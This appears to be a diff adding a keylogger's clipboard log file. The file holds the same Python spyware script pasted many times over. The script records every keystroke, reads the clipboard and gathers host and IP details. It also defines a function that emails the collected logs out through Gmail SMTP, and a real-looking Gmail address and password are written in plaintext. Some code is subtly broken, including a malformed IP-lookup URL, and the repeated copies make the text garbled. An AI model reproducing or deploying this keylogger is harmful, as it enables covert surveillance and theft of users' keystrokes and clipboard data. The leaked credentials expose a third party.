@@ -1,0 +1,1973 @@
+Clipboard Data: 
+root.localhost.Clipboard Data: 
+key2.pyClipboard Data: 
+key2.pyClipboard Data: 
+key2.pyClipboard Data: 
+key2.pyClipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard could be not be copiedClipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(keys)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+Clipboard Data: 
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+toaddr = "pawarrudalib@gmail.com"
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudali@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
